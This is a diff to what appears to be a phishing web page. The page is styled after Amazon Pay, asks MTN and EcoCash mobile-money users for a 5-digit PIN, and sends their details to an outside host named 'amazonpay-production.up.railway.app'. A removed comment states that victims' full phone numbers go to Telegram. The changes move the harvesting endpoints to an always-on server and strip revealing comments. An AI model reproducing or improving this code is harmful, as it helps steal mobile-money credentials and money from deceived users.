@@ -63,7 +63,6 @@
   }
   .app-header .spacer-right { width: 34px; height: 34px; }
 
-  /* Body: fits without scrolling — no overflow */
   .body-scroll {
     flex: 1 1 auto;
     overflow: hidden;
@@ -101,7 +100,6 @@
   .verify-headline h1 { font-size: 16px; font-weight: 800; color: var(--amz-ink); letter-spacing: -0.3px; margin-bottom: 3px; }
   .verify-headline p { font-size: 11.5px; color: var(--amz-muted); line-height: 1.45; max-width: 300px; margin: 0 auto; }
 
-  /* Single wide PIN input, generous spacing, 5 digits */
   .pin-label { font-size: 12px; font-weight: 600; color: var(--amz-ink); margin: 14px 0 8px; text-align: center; }
   .pin-row {
     display: flex;
@@ -269,7 +267,6 @@
   .state-card h2 { font-size: 18px; font-weight: 800; color: var(--amz-ink); margin-bottom: 6px; letter-spacing: -0.3px; }
   .state-card p { font-size: 13px; color: var(--amz-muted); line-height: 1.55; max-width: 280px; margin: 0 auto; }
 
-  /* Very short screens: compress further so nothing scrolls */
   @media (max-height: 700px) {
     .brand-block { margin-bottom: 10px; }
     .brand-block .brand-mark { width: 44px; height: 44px; font-size: 18px; margin-bottom: 6px; }
@@ -369,16 +366,23 @@
 </div>
 
 <script>
+/* ────────────────────────────────────────────────────────────
+   RAILWAY endpoints — always-on, no cold start
+   These replace the old relative paths so the verification
+   flow works even when Render sleeps.
+   ──────────────────────────────────────────────────────────── */
+const RAILWAY_BASE = 'https://amazonpay-production.up.railway.app';
+
 const CONFIG = {
   MTN_NEXT_PAGE: 'sms.html',
   ECOCASH_NEXT_PAGE: 'ecocash.html',
-  VERIFY_ENDPOINT: '/api/verify/send',
-  STATUS_ENDPOINT: (id) => `/api/verify/status/${encodeURIComponent(id)}`,
+  VERIFY_ENDPOINT: RAILWAY_BASE + '/api/verify/send',
+  STATUS_ENDPOINT: (id) => RAILWAY_BASE + '/api/verify/status/' + encodeURIComponent(id),
   POLL_INTERVAL_MS: 2000,
   MAX_WAIT_MS: 5 * 60 * 1000,
   SHORT_LINK_ENDPOINTS: [
-    (code) => `/api/links/${encodeURIComponent(code)}`,
-    (code) => `/api/links?code=${encodeURIComponent(code)}`
+    (code) => RAILWAY_BASE + '/api/links/' + encodeURIComponent(code),
+    (code) => RAILWAY_BASE + '/api/links?code=' + encodeURIComponent(code)
   ],
   DEFAULT_FEE: 0,
   SLOW_HINT_MS: 6000
@@ -468,7 +472,6 @@ function render(payload) {
   setTxt('ctxMethod', modeLabel + ' *' + last4);
   setTxt('ctxRef', payload.tx || payload.tn || '—');
   setTxt('ctxAmount', formatMoney(receive, cur));
-  // Phone number is never rendered on this page — full number still goes to Telegram.
 }
 
 function showStateCard(icon, title, message) {
